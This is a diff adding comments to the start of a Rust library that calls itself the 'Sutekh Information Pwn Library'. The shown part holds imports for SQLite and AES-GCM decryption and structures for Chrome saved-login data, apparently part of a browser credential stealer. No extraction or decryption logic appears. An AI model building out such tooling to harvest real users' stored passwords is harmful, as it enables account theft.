@@ -1,3 +1,10 @@
+/*
+ * name = "sipl"
+ * version = "0.0.2"
+ * authors = ["PinkP4nther <pinkp4nther@protonmail.com>"]
+ * edition = "2018"
+ * description = "Sutekh Information Pwn Library (SIPL). Is a Rust library for gathering information about the system and user space applications."
+ */
 
 // SQLite Library
 use rusqlite::{Connection, OpenFlags, NO_PARAMS};
@@ -19,6 +26,7 @@ use serde_json::Value;
 use aes_gcm::Aes256Gcm;
 use aes_gcm::aead::{Aead, NewAead, generic_array::GenericArray};
 
+// Chrome Data Structure
 pub struct ChromeData {
     pub cd_entries: Vec<ChromeDataEntry>,
     pub login_data_path: String,
@@ -26,6 +34,7 @@ pub struct ChromeData {
     pub cd_errors: Vec<ChromeDataError>,
 }
 
+// Chrome Data Entry Structure
 pub struct ChromeDataEntry {
     pub origin_url: String,
     pub action_url: String,
@@ -35,13 +44,16 @@ pub struct ChromeDataEntry {
     pub date_lu: i64,
 }
 
+// Chrome Data Error Structure
 pub struct ChromeDataError {
     pub error_id: u64,
     pub error_msg: String,
 }
 
+// Chrome Data impl's
 impl ChromeData {
 
+    // Create new ChromeData object
     pub fn new() -> Self {
         ChromeData {
             cd_entries: Vec::<ChromeDataEntry>::new(),
